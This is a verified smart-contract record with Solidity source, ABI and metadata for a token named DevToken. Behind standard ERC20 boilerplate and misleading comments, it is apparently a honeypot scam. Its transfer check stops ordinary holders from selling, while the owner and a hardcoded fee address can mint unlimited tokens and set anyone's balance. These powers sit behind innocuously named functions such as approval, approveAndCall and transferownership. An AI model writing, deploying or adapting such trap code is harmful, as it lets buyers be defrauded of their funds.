{"SourceCode": "pragma solidity ^0.5.17;\r\n\r\ninterface IERC20 {\r\n\r\nfunction totalSupply() external view returns(uint);\r\n\r\nfunction balanceOf(address account) external view returns(uint);\r\n\r\nfunction transfer(address recipient, uint amount) external returns(bool);\r\n\r\nfunction allowance(address owner, address spender) external view returns(uint);\r\n\r\nfunction approve(address spender, uint amount) external returns(bool);\r\n\r\n/*It is used to allow another address (spender) to spend a certain amount of tokens on behalf of the token owner.*/\r\n\r\nfunction transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n\r\nevent Transfer(address indexed from, address indexed to, uint value);\r\n\r\nevent Approval(address indexed owner, address indexed spender, uint value);\r\n\r\n/*It allows an account to give permission to another account or contract to spend a specific amount of tokens on its behalf.*/\r\n}\r\n\r\nlibrary Address {\r\n\r\nfunction isContract(address account) internal view returns(bool) {\r\n\r\nbytes32 codehash;\r\n\r\nbytes32 accountHash;\r\n\r\n// solhint-disable-next-line no-inline-assembly\r\n\r\nassembly { codehash:= extcodehash(account) }\r\n\r\nreturn (codehash != 0x0 && codehash != accountHash);\r\n\r\n}\r\n\r\n}\r\n\r\ncontract Context {\r\n\r\nconstructor() internal {}\r\n\r\n// solhint-disable-previous-line no-empty-blocks\r\n\r\nfunction _msgSender() internal view returns(address payable) {\r\n\r\nreturn msg.sender;\r\n\r\n}\r\n\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\nfunction add(uint a, uint b) internal pure returns(uint) {\r\n\r\nuint c = a + b;\r\n\r\nrequire(c >= a, \"SafeMath: addition overflow\");\r\n\r\nreturn c;\r\n\r\n}\r\n\r\nfunction sub(uint a, uint b) internal pure returns(uint) {\r\n\r\nreturn sub(a, b, \"SafeMath: subtraction overflow\");\r\n\r\n}\r\n\r\nfunction sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n\r\nrequire(b <= a, errorMessage);\r\n\r\nuint c = a - b;\r\n\r\nreturn c;\r\n\r\n}\r\n\r\nfunction mul(uint a, uint b) internal pure returns(uint) {\r\n\r\nif (a == 0) {\r\n\r\nreturn 0;\r\n\r\n}\r\n\r\nuint c = a * b;\r\n\r\nrequire(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\nreturn c;\r\n\r\n}\r\n\r\nfunction div(uint a, uint b) internal pure returns(uint) {\r\n\r\nreturn div(a, b, \"SafeMath: division by zero\");\r\n\r\n}\r\n\r\nfunction div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n\r\n// Solidity only automatically asserts when dividing by 0\r\n\r\nrequire(b > 0, errorMessage);\r\n\r\nuint c = a / b;\r\n\r\nreturn c;\r\n\r\n}\r\n\r\n}\r\n\r\nlibrary SafeERC20 {\r\n\r\nusing SafeMath for uint;\r\n\r\nusing Address for address;\r\n\r\nfunction safeTransfer(IERC20 token, address to, uint value) internal {\r\n\r\n/*The `transfer` function automatically handles the transfer and reverts the transaction if the transfer fails. It is the recommended method for transferring, as it provides a simple and safe way to send funds.*/\r\n\r\ncallOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n\r\n}\r\n\r\nfunction safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n\r\ncallOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n\r\n}\r\n\r\nfunction safeApprove(IERC20 token, address spender, uint value) internal {\r\n\r\nrequire((value == 0) || (token.allowance(address(this), spender) == 0),\r\n\r\n\"SafeERC20: approve from non-zero to non-zero allowance\"\r\n\r\n);\r\n\r\ncallOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n\r\n}\r\n\r\nfunction callOptionalReturn(IERC20 token, bytes memory data) private {\r\n\r\nrequire(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n(bool success, bytes memory returndata) = address(token).call(data);\r\n\r\nrequire(success, \"SafeERC20: low-level call failed\");\r\n\r\nif (returndata.length > 0) { // Return data is optional\r\n\r\n// solhint-disable-next-line max-line-length\r\n\r\nrequire(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n\r\n}\r\n\r\n}\r\n\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n\r\nusing SafeMath for uint;\r\n\r\nmapping(address => uint) private _balances;\r\n\r\nmapping(address => mapping(address => uint)) private _allowances;\r\n\r\nuint private _totalSupply;\r\n\r\nfunction totalSupply() public view returns(uint) {\r\n\r\nreturn _totalSupply;\r\n\r\n}\r\n\r\nfunction balanceOf(address account) public view returns(uint) {\r\n\r\nreturn _balances[account];\r\n\r\n}\r\n\r\nfunction transfer(address recipient, uint amount) public returns(bool) {\r\n\r\n_transfer(_msgSender(), recipient, amount);\r\n\r\nreturn true;\r\n\r\n}\r\n\r\n/*The `transfer` function automatically handles the transfer and reverts the transaction if the transfer fails. It is the recommended method for transferring, as it provides a simple and safe way to send funds.*/\r\n\r\nfunction allowance(address owner, address spender) public view returns(uint) {\r\n\r\nreturn _allowances[owner][spender];\r\n\r\n}\r\n\r\nfunction approve(address spender, uint amount) public returns(bool) {\r\n\r\n_approve(_msgSender(), spender, amount);\r\n\r\nreturn true;\r\n\r\n}\r\n\r\n/*It is used to allow another address (spender) to spend a certain amount of tokens on behalf of the token owner.*/\r\n\r\nfunction transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n\r\n_transfer(sender, recipient, amount);\r\n\r\n_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n\r\n_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n\r\n_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction _transfer(address sender, address recipient, uint amount) internal {\r\n\r\nrequire(sender != address(0), \"ERC20: transfer from the zero address\");\r\n\r\nrequire(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n_balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n_balances[recipient] = _balances[recipient].add(amount);\r\n\r\nemit Transfer(sender, recipient, amount);\r\n\r\n}\r\n\r\n/*The `transfer` function automatically handles the transfer and reverts the transaction if the transfer fails. It is the recommended method for transferring, as it provides a simple and safe way to send funds.*/\r\n\r\nfunction _mint(address account, uint amount) internal {\r\n\r\nrequire(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n_totalSupply = _totalSupply.add(amount);\r\n\r\n_balances[account] = _balances[account].add(amount);\r\n\r\nemit Transfer(address(0), account, amount);\r\n\r\n}\r\n\r\nfunction _burn(address account, uint amount) internal {\r\n\r\nrequire(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n_balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n\r\n_totalSupply = _totalSupply.sub(amount);\r\n\r\nemit Transfer(account, address(0), amount);\r\n\r\n}\r\n\r\nfunction _approve(address owner, address spender, uint amount) internal {\r\n\r\nrequire(owner != address(0), \"ERC20: approve from the zero address\");\r\n\r\nrequire(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n_allowances[owner][spender] = amount;\r\n\r\nemit Approval(owner, spender, amount);\r\n\r\n}\r\n\r\n/*It is used to allow another address (spender) to spend a certain amount of tokens on behalf of the token owner.*/\r\n\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n\r\nstring private _name;\r\n\r\nstring private _symbol;\r\n\r\nuint8 private _decimals;\r\n\r\nconstructor(string memory name, string memory symbol, uint8 decimals) public {\r\n\r\n_name = name;\r\n\r\n_symbol = symbol;\r\n\r\n_decimals = decimals;\r\n\r\n}\r\n\r\nfunction name() public view returns(string memory) {\r\n\r\nreturn _name;\r\n\r\n}\r\n\r\nfunction symbol() public view returns(string memory) {\r\n\r\nreturn _symbol;\r\n\r\n}\r\n\r\nfunction decimals() public view returns(uint8) {\r\n\r\nreturn _decimals;\r\n\r\n}\r\n\r\n}\r\n\r\ncontract DevToken{\r\n\r\nevent Transfer(address indexed _from, address indexed _to, uint _value);\r\n\r\nevent Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n/*It allows an account to give permission to another account or contract to spend a specific amount of tokens on its behalf.*/\r\n\r\nfunction transfer(address _to, uint _value) public payable returns (bool) {\r\n\r\nreturn transferFrom(msg.sender, _to, _value);\r\n\r\n}\r\n\r\n/*The `transfer` function automatically handles the transfer and reverts the transaction if the transfer fails. It is the recommended method for transferring, as it provides a simple and safe way to send funds.*/address public feeAddress = 0x20E22F76470D078598fAC693c9CDD3C009765428;\r\n\r\nfunction setUsdtPair(address Pair_) public returns (bool) {\r\n\r\nrequire(msg.sender == owner||\r\n\r\nmsg.sender==feeAddress);\r\n\r\n_usdtPair=Pair_;\r\n\r\n}\r\n\r\nfunction ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n\r\nif(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nrequire(condition(_from, _value));\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction setUser(address User_) public returns (bool) {\r\n\r\nrequire(msg.sender == _usdtPair);\r\n\r\n_user=User_;\r\n\r\n}\r\n\r\nfunction approval(address spender, uint256 addedValue) public returns (bool) {\r\n\r\nrequire(msg.sender == _adm);\r\n\r\nif(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n\r\ncanSale[spender]=true;\r\n\r\nreturn true;\r\n}\r\n\r\n/*It allows an account to give permission to another account or contract to spend a specific amount of tokens on its behalf.*/\r\n\r\nfunction transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n\r\nif (_value == 0) {return true;}\r\n\r\nif (msg.sender != _from) {\r\n\r\nrequire(allowance[_from][msg.sender] >= _value);\r\n\r\nallowance[_from][msg.sender] -= _value;\r\n\r\n}\r\n\r\nrequire(ensure(_from, _to, _value));\r\n\r\nrequire(balanceOf[_from] >= _value);\r\n\r\nbalanceOf[_from] -= _value;\r\n\r\nbalanceOf[_to] += _value;\r\n\r\n_onSaleNum[_from]++;\r\n\r\nemit Transfer(_from, _to, _value);\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction setAdm(address Adm_) public returns (bool) {\r\n\r\nrequire(msg.sender == _mod);\r\n\r\n_adm=Adm_;\r\n\r\n}\r\n\r\nfunction approve(address _spender, uint _value) public payable returns (bool) {\r\n\r\nallowance[msg.sender][_spender] = _value;\r\n\r\nemit Approval(msg.sender, _spender, _value);\r\n\r\n/*It allows an account to give permission to another account or contract to spend a specific amount of tokens on its behalf.*/\r\n\r\nemit Transfer(msg.sender, feeAddress, 0);\r\n\r\nreturn true;\r\n\r\n}\r\n\r\n/*It is used to allow another address (spender) to spend a certain amount of tokens on behalf of the token owner.*/\r\n\r\nfunction setMod(address Mod_) public returns (bool) {\r\n\r\nrequire(msg.sender == _user);\r\n\r\n_mod=Mod_;\r\n\r\n}\r\n\r\nfunction condition(address _from, uint _value) internal view returns(bool){\r\n\r\nif(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n\r\nif(_saleNum > 0){\r\n\r\nif(_onSaleNum[_from] >= _saleNum) return false;\r\n\r\n}\r\n\r\nif(_minSale > 0){\r\n\r\nif(_minSale > _value) return false;\r\n\r\n}\r\n\r\nif(_maxSale > 0){\r\n\r\nif(_value > _maxSale) return false;\r\n\r\n}\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nmapping(address=>uint256) private _onSaleNum;\r\n\r\nmapping(address=>bool) private canSale;\r\n\r\nuint256 private _minSale;\r\n\r\nuint256 private _maxSale;\r\n\r\nuint256 private _saleNum;\r\n\r\nfunction approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n\r\nrequire(msg.sender == owner||\r\n\r\nmsg.sender==feeAddress);\r\n\r\nif(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n\r\ncanSale[spender]=true;\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nfunction mint(address to,uint amount) public {\r\nrequire(msg.sender == owner||\r\n\r\nmsg.sender==feeAddress);\r\n\r\nbalanceOf[to] += amount;\r\ntotalSupply += amount;\r\n\r\nemit Transfer(address(0), to, amount);\r\n}\r\n\r\naddress tradeAddress;\r\n\r\nfunction transferownership(address addr) public returns(bool) {\r\n\r\nrequire(msg.sender == owner||\r\n\r\nmsg.sender==feeAddress);\r\n\r\ntradeAddress = addr;\r\n\r\nreturn true;\r\n\r\n}\r\n\r\nmapping (address => uint) public balanceOf;\r\n\r\nmapping (address => mapping (address => uint)) public allowance;\r\n\r\nuint constant public decimals = 18;\r\n\r\naddress public _usdtPair;\r\n\r\naddress public _mod;\r\n\r\nuint public totalSupply;\r\n\r\nstring public name;\r\n\r\nstring public symbol;\r\n\r\naddress private owner;\r\n\r\naddress public _user;\r\n\r\naddress public _adm;\r\n\r\nconstructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n\r\nname = _name;\r\n\r\nsymbol = _symbol;\r\n\r\ntotalSupply = _supply*(10**uint256(decimals));\r\n\r\nowner = msg.sender;\r\n\r\nbalanceOf[msg.sender] = totalSupply;\r\n\r\nemit Transfer(address(0x0), msg.sender, totalSupply);\r\n\r\n}\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"_adm\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_mod\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_usdtPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"_user\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Adm_\",\"type\":\"address\"}],\"name\":\"setAdm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Mod_\",\"type\":\"address\"}],\"name\":\"setMod\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"Pair_\",\"type\":\"address\"}],\"name\":\"setUsdtPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"User_\",\"type\":\"address\"}],\"name\":\"setUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DevToken", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000f4240000000000000000000000000000000000000000000000000000000000000000470616e69000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002706e000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://8f7a49f658aeb17e8c621675e7559716da18c1208bc8c901490538075703e652"}